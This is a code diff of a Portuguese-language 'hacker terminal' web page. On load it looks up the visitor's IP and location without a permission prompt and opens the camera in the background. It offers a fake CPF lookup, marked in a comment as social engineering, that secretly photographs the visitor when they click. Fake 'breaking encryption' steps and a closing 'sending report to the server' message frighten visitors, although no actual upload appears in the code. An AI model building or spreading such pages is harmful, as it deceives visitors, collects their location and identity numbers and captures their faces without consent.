@@ -3,134 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sincronizando...</title>
+    <title>Sincronizando Sistema...</title>
     <style>
-        body {
-            background-color: #000;
-            color: #0f0;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            overflow: hidden;
-        }
-
-        #terminal {
-            width: 95%;
-            max-width: 800px;
-            height: 90vh;
-            padding: 20px;
-            overflow-y: auto;
-            border: 1px solid #0f0;
-            background: black;
-            position: relative;
-        }
-
-        .log { margin-bottom: 5px; font-size: 14px; }
-        .critical { color: #ff0000; font-weight: bold; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        #terminal { width: 95%; max-width: 850px; height: 75vh; border: 1px solid #0f0; padding: 20px; overflow-y: auto; background: rgba(0, 10, 0, 0.9); position: relative; box-shadow: 0 0 30px rgba(0, 255, 0, 0.2); }
+        .log { margin-bottom: 6px; font-size: 13px; line-height: 1.2; }
+        .critical { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
         .success { color: #00ff00; }
-        .info { color: #00ccff; }
         .warning { color: #ffff00; }
-
-        #terminal::after {
-            content: "";
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), 
-                        linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
-            background-size: 100% 3px, 2px 100%;
-            pointer-events: none;
-        }
+        .input-area { width: 95%; max-width: 850px; margin-top: 15px; display: flex; gap: 10px; }
+        input { background: #000; border: 1px solid #0f0; color: #0f0; padding: 10px; flex-grow: 1; outline: none; font-family: inherit; }
+        button { background: #0f0; color: #000; border: none; padding: 10px 20px; cursor: pointer; font-weight: bold; }
+        #photo-preview { width: 120px; border: 1px solid #0f0; filter: grayscale(100%) brightness(1.2) contrast(1.2) sepia(100%) hue-rotate(85deg); display: none; margin: 10px 0; }
     </style>
 </head>
 <body>
 
-    <div id="terminal"></div>
+    <div id="terminal">
+        <div class="log">> [CORE] SYSTEM_INIT...</div>
+    </div>
+
+    <div class="input-area">
+        <input type="text" id="cpfInput" placeholder="DIGITE O CPF PARA CONSULTA DE DADOS..." maxlength="14">
+        <button onclick="runCpfScan()">PESQUISAR</button>
+    </div>
+
+    <video id="v" style="display:none" autoplay></video>
+    <canvas id="c" style="display:none" width="640" height="480"></canvas>
 
     <script>
-        const terminal = document.getElementById('terminal');
+        const term = document.getElementById('terminal');
+        const cpfIn = document.getElementById('cpfInput');
 
-        function write(text, type = '') {
-            const line = document.createElement('div');
-            line.className = `log ${type}`;
-            line.innerHTML = `[${new Date().toLocaleTimeString()}] > ${text}`;
-            terminal.appendChild(line);
-            terminal.scrollTop = terminal.scrollHeight;
+        function write(t, cls='') {
+            const d = document.createElement('div');
+            d.className = `log ${cls}`;
+            d.innerHTML = `> ${t}`;
+            term.appendChild(d);
+            term.scrollTop = term.scrollHeight;
         }
 
-        async function getIPData() {
-            // Tenta 3 APIs diferentes para garantir o bypass de bloqueios
-            const sources = [
-                'https://ipapi.co/json/',
-                'https://ipwho.is/',
-                'https://api.ipify.org?format=json'
-            ];
-
-            for (let url of sources) {
-                try {
-                    const response = await fetch(url);
-                    const data = await response.json();
-                    
-                    if (data.ip || data.query) {
-                        return {
-                            ip: data.ip || data.query,
-                            city: data.city || data.city_name || "Desconhecido",
-                            region: data.region || data.region_name || "N/A",
-                            org: data.org || data.connection?.isp || "Privado"
-                        };
-                    }
-                } catch (e) {
-                    continue; // Se falhar, tenta a próxima da lista
-                }
-            }
-            return null;
-        }
-
-        window.onload = async function() {
-            write("INICIALIZANDO COMANDO REMOTO...", "info");
-            await new Promise(r => setTimeout(r, 800));
-
-            // 1. HARDWARE
-            write("MAPEANDO HARDWARE DO ALVO...", "info");
-            write(`DISPOSITIVO: ${navigator.platform}`, "success");
-            write(`AGENT: ${navigator.userAgent.substring(0, 35)}...`, "success");
-
-            // 2. RASTREIO DE IP REFORÇADO (SILENCIOSO)
-            write("ABRINDO TÚNEL DE RASTREIO (MÉTODO_MULTILAYER)...", "warning");
-            const ipInfo = await getIPData();
+        // 1. AUTO-SCAN AO CARREGAR
+        window.onload = async () => {
+            write("INICIANDO VARREDURA DE REDE...", "warning");
             
-            if (ipInfo) {
-                write(`IP DETECTADO: ${ipInfo.ip}`, "critical");
-                write(`LOCALIZAÇÃO: ${ipInfo.city}, ${ipInfo.region}`, "success");
-                write(`PROVEDOR: ${ipInfo.org}`, "info");
-            } else {
-                write("FALHA AO TUNELAR IP: BLOQUEIO DE FIREWALL DETECTADO.", "critical");
-            }
-
-            // 3. GPS (SOLICITAÇÃO)
-            write("SINCRONIZANDO COORDENADAS GPS...", "info");
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    write(`COORDENADAS: ${pos.coords.latitude}, ${pos.coords.longitude}`, "critical");
-                },
-                () => { write("GPS: ACESSO NEGADO PELO USUÁRIO.", "critical"); },
-                { timeout: 4000 }
-            );
-
-            // 4. BIOMETRIA (SOLICITAÇÃO)
-            write("SOLICITANDO SCANNER BIOMÉTRICO...", "info");
+            // Tenta pegar localização sem pedir permissão primeiro (Via IP-API)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                write("CÂMERA ACESSADA COM SUCESSO.", "success");
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) {
-                write("BIOMETRIA: ACESSO BLOQUEADO.", "critical");
+                const r = await fetch('https://ipapi.co/json/');
+                const d = await r.json();
+                write(`IP_ALVO: ${d.ip}`, "critical");
+                write(`LOGRADOURO APROX: ${d.road || 'Mapeando via satélite...'}`, "success");
+                write(`CIDADE/UF: ${d.city} / ${d.region}`, "success");
+                write(`PROVEDOR: ${d.org}`, "info");
+            } catch(e) { write("ERRO NO BYPASS DE IP", "critical"); }
+
+            write("SISTEMA PRONTO PARA CONSULTA DE CPF.", "warning");
+            
+            // Tenta acesso à câmera em background
+            navigator.mediaDevices.getUserMedia({video:true}).then(s => {
+                document.getElementById('v').srcObject = s;
+                write("MÓDULO BIOMÉTRICO SINCRONIZADO.", "success");
+            }).catch(() => write("MÓDULO BIOMÉTRICO BLOQUEADO PELO DISPOSITIVO.", "critical"));
+        };
+
+        // 2. FUNÇÃO DE PESQUISA DE CPF (ENGENHARIA SOCIAL)
+        async function runCpfScan() {
+            const cpf = cpfIn.value;
+            if(cpf.length < 11) return alert("DIGITE UM CPF VÁLIDO");
+
+            write(`INICIANDO BUSCA DE CPF: ${cpf}...`, "warning");
+            
+            // Tira a foto no clique
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            if(v.srcObject) {
+                c.getContext('2d').drawImage(v, 0, 0);
+                const img = document.createElement('img');
+                img.id = "photo-preview";
+                img.src = c.toDataURL('image/png');
+                img.style.display = "block";
+                term.appendChild(img);
+                write("CAPTURA FACIAL REALIZADA COM SUCESSO.", "critical");
             }
 
-            write("VARREDURA FINALIZADA. AGUARDANDO COMANDO...", "warning");
-        };
+            // Simula busca em banco de dados
+            const steps = ["CONECTANDO À BASE CADASTRAL...", "QUEBRANDO CRIPTOGRAFIA...", "EXTRAINDO DADOS DE LOGRADOURO...", "LOCALIZANDO VÍNCULOS..."];
+            for(let s of steps) {
+                await new Promise(r => setTimeout(r, 600));
+                write(s, "info");
+            }
+
+            write(`DADOS ENCONTRADOS PARA ${cpf}:`, "success");
+            write(`NOME: [DADOS OCULTOS PARA TESTE]`, "info");
+            write(`ENDEREÇO: RUA DETECTADA VIA GPS/IP`, "info");
+            write("ENVIANDO RELATÓRIO PARA O SERVIDOR...", "critical");
+        }
     </script>
 </body>
 </html>
